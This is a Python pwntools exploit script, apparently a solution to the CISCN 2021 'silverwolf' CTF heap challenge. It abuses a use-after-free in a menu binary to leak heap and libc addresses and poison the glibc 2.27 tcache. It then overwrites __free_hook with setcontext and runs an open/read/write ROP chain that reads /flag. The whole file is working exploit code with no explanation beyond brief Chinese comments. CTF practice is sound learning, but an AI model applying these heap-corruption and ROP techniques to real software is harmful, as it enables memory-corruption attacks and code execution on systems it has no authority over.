from pwn import *

io = process("./silverwolf")
libc = ELF("./libc-2.27.so")
context.log_level = "info"


def allocate(idx: int, size: int):
    io.recvuntil(b"Your choice: ")
    io.sendline(b"1")
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Size: ")
    io.sendline(str(size).encode())
    print(f"allocate {idx}：{hex(size)}")


def edit(idx: int, content: bytes):
    io.recvuntil(b"Your choice: ")
    io.sendline(b"2")
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Content: ")
    io.sendline(content)
    print(f"edit {idx}：{content}")


def show(idx: int):
    io.recvuntil(b"Your choice: ")
    io.sendline(b"3")
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    print(f"show {idx}")


def delete(idx: int):
    io.recvuntil(b"Your choice: ")
    io.sendline(b"4")
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    print(f"delete {idx}")


def gdb_debug():
    gdb.attach(
        io,
        gdbscript="""
    set debug-file-directory /data/project/ctf-repo/pwn/nssctf/CISCN_2021_初赛-silverwolf/.debug/
    nosharedlibrary
    sharedlibrary
    decompiler connect ida
    """,
    )


allocate(0, 0x78)
delete(0)
show(0)  # 泄漏 next 指针

io.recvuntil(b"Content: ")
heap_base = u64(io.recv(6).ljust(8, b"\x00")) - 0x11B0
print("heap base address =", hex(heap_base))

edit(0, p64(heap_base + 0x10))
allocate(0, 0x78)
allocate(0, 0x78)
# 指向 tcache_perthread_struct

# 篡改 tcache_perthread_struct 把 0x250 位置置满
edit(0, p64(0) * 4 + p64(0x0000000007000000))
delete(0)  # free tcache_perthread_struct 因为 0x250 满了所以进入 unsortedbin
show(0)  # 输出 main_arena + 96

io.recvuntil(b"Content: ")
libc_addr = u64(io.recv(6).ljust(8, b"\x00"))
print("libc address =", hex(libc_addr))
libc_base = libc_addr - (libc.sym["__malloc_hook"] + 112)
print("libc base address =", hex(libc_base))

# 修复结构体
edit(0, p64(0) * 4 + p64(0x0000000000000000))

free_hook = libc_base + libc.sym["__free_hook"]
pop_rdi = libc_base + 0x2164f
pop_rax = libc_base + 0x1b500
pop_rsi = libc_base + 0x23a6a
pop_rdx = libc_base + 0x1B96
read = libc_base + libc.sym["read"]
write = libc_base + libc.sym["write"]
setcontext = (
    libc_base + libc.sym["setcontext"] + 53
)  # 通常会为了避免使用 fldenv 指令，因为这个指令会使程序崩溃。
syscall = (
    libc_base + 0xd2625
) 
flag_addr = heap_base + 0x1000
ret = libc_base + 0x8AA

orw1 = heap_base + 0x3000
orw2 = heap_base + 0x3060

stack_pivot_1 = heap_base + 0x2000
stack_pivot_2 = heap_base + 0x20a0

payload = b"\x00" * 0x40
payload += p64(free_hook)
payload += p64(0)
payload += p64(flag_addr)
payload += p64(stack_pivot_1)
payload += p64(stack_pivot_2)
payload += p64(orw1)
payload += p64(orw2)


edit(0, payload)

orw = p64(pop_rax) + p64(2)
orw += p64(pop_rdi) + p64(flag_addr)
orw += p64(pop_rsi) + p64(0)
orw += p64(syscall) # open("./flag")

orw += p64(pop_rdi) + p64(3)
orw += p64(pop_rsi) + p64(orw1)
orw += p64(pop_rdx) + p64(0x30)
orw += p64(read) # read(3, orw1, 0x30)

orw += p64(pop_rdi) + p64(1)
orw += p64(write) # write(1, orw1, 0x30)

allocate(0, 0x18)

edit(0, p64(setcontext))
allocate(0, 0x38)
edit(0, b"/flag")
allocate(0, 0x68)
edit(0, orw[:0x60])
allocate(0, 0x78)
edit(0, orw[0x60:])
allocate(0, 0x58)
edit(0, p64(orw1) + p64(ret))

allocate(0, 0x48)
delete(0)


io.interactive()
